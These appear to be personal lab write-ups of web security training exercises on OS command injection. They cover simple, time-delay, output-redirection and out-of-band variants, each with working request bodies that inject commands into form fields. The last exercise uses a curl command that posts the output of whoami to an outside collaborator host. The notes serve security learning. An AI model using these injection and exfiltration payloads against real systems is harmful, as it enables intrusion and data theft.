# OS command injection, simple case
1. Load site
2. Check stock feature creates a POST request passing two parameters
3. Inject `whoami` command into `storeId` parameter
```
productId=2&storeId=1;whoami
```
# Blind OS command injection with time delays
1. Load site
2. Use "Submit feedback" feature to send POST request
3. Probe each parameter to trigger a time delay e.g. `sleep 10`
	1. Crafting subshell command injection in `message` parameter works
```
csrf=CtksuTKrOaFdpXRrJA3Zxu3kwCNnuR83&name=Name&email=email%40email.com&subject=Subject&message=`sleep+10`
```
# Blind OS command injection with output redirection
1. Load site
2. Use "Submit feedback" feature to send POST request
3. Probe each parameter to trigger a time delay e.g. `sleep 10`
	1. Crafting subshell command injection in `message` parameter works
4. `/images` is a directory serving files we can read from the server
5. Execute system command and direct output to `/var/www/images`
	1. I used hackvertor in Repeater, the command is `whoami >> /var/www/images/whoami.txt`
```
csrf=jI3Rp4Jszha0FlMUq6EDlzQ7FrQSMLJp&name=name&email=email%40email.com&subject=subject&message=`<@urlencode>whoami >> /var/www/images/whoami.txt</@urlencode>`
```
6. Retrieve output from the file inclusion parameter
```
/image?filename=whoami.txt
```
# Blind OS command injection with out-of-band interaction
1. Load site
2. Use "Submit feedback" feature to send POST request
3. Probe each parameter to make an out-of-band call to collaborator e.g. `curl https://z77n0giz7m3jsab4k36ko36lnct3hu5j.oastify.com`
4. `name` parameter is vulnerable using Linux subshell
```
csrf=5bYcqYiwlClONhiJqX1v0Mz4fEKXtKqh&name=`curl+https://z77n0giz7m3jsab4k36ko36lnct3hu5j.oastify.com`&email=email%40email.com&subject=subject&message=message
```
5. Check collaborator and confirm HTTP requests made to our server
# Blind OS command injection with out-of-band data exfiltration
1. Load site
2. Use "Submit feedback" feature to send POST request
3. Probe each parameter to make an out-of-band call to collaborator e.g. `curl https://z77n0giz7m3jsab4k36ko36lnct3hu5j.oastify.com`
4. `name` parameter is vulnerable using Linux subshell
```
csrf=B99l8S7aeJNsM5d2rXMv1htIf13OMaQ4&name=name`curl+https://dr81ku2dr0nxcovi4hqy8hqz7qdh1apz.oastify.com`&email=email%40email.com&subject=subject&message=message
```
5. `name` parameter was too short for successful OOB exfiltration, fortunately `message` parameter is vulnerable as well
6. Use a `curl` command and send a POST request using another system command as the body data
```
csrf=B99l8S7aeJNsM5d2rXMv1htIf13OMaQ4&name=name&email=email%40email.com&subject=subject&message=message`curl+-X+POST+-d+"$(whoami)"+https://1kmpdiv1kogl5co6x5jm15jn0e65u0ip.oastify.com`
```
- Without URL encoding the payload is:
```
curl -X POST -d "$(whoami)" https://1kmpdiv1kogl5co6x5jm15jn0e65u0ip.oastify.com
```
7. Check Collaborator events for and look at the HTTP request to read the output of the commands